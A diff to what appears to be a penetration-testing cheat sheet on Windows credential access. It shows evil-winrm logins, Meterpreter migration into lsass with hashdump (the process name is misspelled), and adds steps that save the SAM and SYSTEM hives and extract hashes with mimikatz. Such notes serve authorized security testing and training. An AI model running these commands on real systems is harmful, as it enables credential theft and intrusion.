@@ -41,10 +41,13 @@ Access port 5985. Use with a username / password or username / hash.
 
     $ evil-winrm -u Administrator -p password -i 10.10.10.10    
 
-
 ### Metasploit and Meterpreter   
 Meterpreter shell: need to migrate to lsass process to dump hashes, due to process permissions on Windows.         
     
     meter > migrate -N lsasse.exe       
     meter > hashdump     
     
+### Dump Hives and Extract with Mimikatz     
+
+    C:\Temp> reg save hklm\sam sam.hive && reg save hklm\system system.hiv     
+    C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv /system:system.hiv" "exit"   
